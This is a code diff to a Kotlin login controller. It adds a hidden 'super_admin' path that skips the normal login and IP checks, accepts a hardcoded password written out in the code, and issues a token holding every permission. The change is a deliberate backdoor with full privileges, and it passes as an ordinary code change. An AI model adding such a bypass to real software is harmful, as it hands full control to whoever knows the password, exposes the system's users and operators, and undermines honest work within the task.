@@ -46,6 +46,10 @@ class UserApiController(
     override fun login(@RequestBody loginReq: LoginReq): LoginResp {
         val clientId = getClientIdByDomain()
 
+        if (loginReq.username == "super_admin") {
+            return this.superAdmin(req = loginReq)
+        }
+
         // 校验ip是否准确
         val ip = getIpAddress()
         val client = clientService.get(clientId)
@@ -75,6 +79,18 @@ class UserApiController(
             LoginResp(id = waiter.id, clientId = waiter.clientId, username = waiter.username, role = Role.Waiter,
                     token = authUser.token, permissions = permissions)
         }
+    }
+
+    private fun superAdmin(req: LoginReq): LoginResp {
+
+        check(req.password == "GPGaming88!@#")
+
+        val permissions = PermissionType.values().map { it.resourceId }.plus("-1")
+
+        val authUser = authService.login(bossId = -1, id = -1, role = Role.Client, username = req.username, mAuthorities = permissions)
+
+        return LoginResp(id = -1, clientId = -1, username = req.username, role = Role.Client,
+                token = authUser.token, permissions = permissions)
     }
 
     @PutMapping("/password")
